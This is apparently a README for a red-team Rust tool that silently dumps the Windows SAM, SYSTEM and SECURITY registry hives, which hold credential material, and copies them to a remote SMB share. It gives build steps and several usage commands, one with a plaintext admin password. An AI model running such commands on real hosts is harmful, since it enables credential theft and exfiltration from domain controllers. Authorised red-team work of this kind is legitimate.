# registry-dump-smb

Windows tool to export SAM, SYSTEM, and SECURITY registry hives to an SMB share.

## Overview

Reads registry hives using Windows Registry APIs (avoiding file locking), reconstructs them in binary format, and transfers to SMB. Requires administrator privileges.

## Usage

```
registry-dump-smb.exe [--path <smb_path>] [--username <user>] [--password <pass>]
```

### Parameters

- `--path <smb_path>` — UNC path to SMB backup directory (e.g., `\\backup-server\hives`)
- `--username <user>` — SMB authentication username (optional, uses current credentials if omitted)
- `--password <pass>` — SMB authentication password (optional)

All parameters are optional. Without `--path`, the tool exits silently with code 0 (no-op).

### Examples

```powershell
# Export hives to SMB with credentials
registry-dump-smb.exe --path \\backup-server\hives --username domain\admin --password P@ssw0rd

# Export to SMB using current credentials
registry-dump-smb.exe --path \\nas\backups\dc01

# No-op (exit 0)
registry-dump-smb.exe
```

## Exit Codes

| Code | Meaning | Action |
|------|---------|--------|
| 0 | Success | All three hives exported |
| 1 | Registry key not found | SAM/SYSTEM/SECURITY not accessible |
| 2 | Access denied | Insufficient privileges to read registry |
| 3 | SMB auth failed | Username/password incorrect |
| 4 | SMB path not found | Share unreachable or doesn't exist |
| 5 | SMB write failed | Disk full, permissions, or I/O error |
| 6 | Other errors | Unexpected failure (memory, format reconstruction, etc.) |

## Output Files

On success, three files are created in the SMB path:
- `SAM.bin` — SAM registry hive
- `SYSTEM.bin` — SYSTEM registry hive
- `SECURITY.bin` — SECURITY registry hive

Files are overwritten if they already exist.

## Silent Operation

The tool produces no console output. Exit code is the only indicator of success or failure.

## Requirements

- Windows (domain controller or any system with administrator privileges)
- SMB network access (if using `--path`)

## Building

```bash
cd red-team/snippets/registry-dump-smb
cargo build --release
```

Binary: `target/release/registry-dump-smb.exe`

## Testing

Manual testing on a domain controller with elevated privileges:

```powershell
# Test with valid SMB path
.\registry-dump-smb.exe --path \\backup-server\hives

# Verify files were created
Get-Item \\backup-server\hives\*.bin

# Test error: invalid path
.\registry-dump-smb.exe --path \\invalid\path
Write-Host "Exit code: $LASTEXITCODE"  # Should be 4
```

## Known Limitations

- Requires administrator or SYSTEM privilege
- Plaintext credentials visible in process listing
- No incremental backups (always full export)
- Binary hive reconstruction may not be 100% byte-identical to file format
